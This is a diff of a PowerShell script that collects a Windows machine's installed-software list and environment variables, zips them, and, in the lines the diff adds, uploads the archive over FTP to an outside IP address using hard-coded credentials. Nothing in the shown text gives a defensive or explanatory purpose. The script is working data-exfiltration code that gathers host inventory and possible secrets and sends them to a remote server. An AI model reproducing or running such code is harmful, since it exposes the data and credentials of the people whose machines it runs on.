@@ -1,10 +1,16 @@
 $guid=New-Guid
 $folderName ="C:\Temp\com${guid}" 
 New-Item $folderName -itemtype directory | Out-Null
-Get-ChildItem -Path C:/Users/$env:UserName -Recurse > $folderName\out.txt
+# Get-ChildItem -Path C:/Users/$env:UserName -Recurse > $folderName\out.txt
 Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize > $folderName\out2.txt
-Dir env: > $folderName\out3.txt
-Compress-Archive -Path $folderName -DestinationPath C:\Temp\out.zip
+Get-ChildItem env: > $folderName\out3.txt
+Compress-Archive -Path $folderName -DestinationPath "C:\Temp\out_${guid}.zip" -Force
 Remove-Item -Recurse -Force $folderName
 
-$File = "C:\Temp\out.zip";
+$File = "C:\Temp\out_${guid}.zip";
+$ftp = "ftp://datuser:daspassworduser@178.62.23.61/files/out_${guid}.zip";
+$webclient = New-Object -TypeName System.Net.WebClient;
+$uri = New-Object -TypeName System.Uri -ArgumentList $ftp;
+$webclient.UploadFile($uri, $File);
+
+#Remove-Item -Recurse -Force ${File}
